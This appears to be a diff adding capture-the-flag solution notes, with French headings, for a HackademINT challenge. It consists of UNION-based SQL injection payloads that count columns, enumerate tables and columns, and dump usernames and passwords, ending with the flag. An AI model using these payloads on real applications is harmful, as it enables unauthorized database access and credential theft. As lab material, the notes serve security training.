@@ -1,0 +1,12 @@
+Nombre de colonnes :
+' union select 0,0,0,0 #
+
+Liste des tables :
+' union select 0,0,table_name,0 from information_schema.tables #
+-> users
+
+' union select 0,0,column_name,0 from information_schema.columns where table_name='messages' #
+-> id, name, password
+
+' union select id, name, password, 0 from users #
+-> HackademINT{1L_D1T_QU1L_4_P1U5_D3_G3N0UX}
